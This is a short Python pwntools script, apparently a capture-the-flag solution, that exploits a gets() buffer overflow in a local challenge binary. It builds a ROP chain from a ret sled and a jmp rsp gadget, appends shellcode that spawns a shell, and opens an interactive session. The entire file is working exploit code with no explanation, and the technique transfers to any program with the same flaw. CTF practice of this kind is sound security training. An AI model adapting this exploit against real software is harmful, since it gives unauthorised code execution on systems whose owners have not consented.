#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64')

elf = ELF('./bin/challenge')
rop = ROP(elf)

io = process('./bin/challenge')
io.recvline_contains(b"SUDDEN DEATH !! IT'S JUST GETS()")

# Put together payload, look ma, no hardcoded addresses
payload = b''
payload += p64(rop.ret.address) * 50
payload += p64(rop.jmp_rsp.address)
payload += asm(shellcraft.sh())

# gets() ends on newline
assert b'\n' not in payload, payload.hex()

# get shell
io.sendline(payload)
io.interactive()
